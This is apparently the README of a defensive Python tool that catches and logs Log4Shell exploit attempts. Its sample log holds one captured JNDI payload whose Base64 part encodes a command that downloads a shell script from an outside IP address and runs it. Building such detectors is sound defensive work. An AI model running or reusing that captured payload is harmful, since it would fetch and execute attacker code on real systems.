# log4j_catcher

Log4j exploit catcher, detect Log4Shell exploits and try to get payloads.
This is a basic python server that listen on a port and logs informations when a wild log4j exploit appears

## Running

```
python3 detector.py [port]
```

Example:
```
$ sudo python3 detector.py 80
2021-12-10 23:39:59,951 INFO:Incoming connection from ('1.2.3.4', 51512)  
2021-12-10 23:40:28,997 INFO:Incoming connection from ('1.2.3.4', 37532)   
2021-12-11 03:53:36,729 INFO:Found payload jndi from ('45.137.21.9', 55378)                        
2021-12-11 03:53:36,729 INFO:URL: 45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==
```

Data is logged into current directory path.
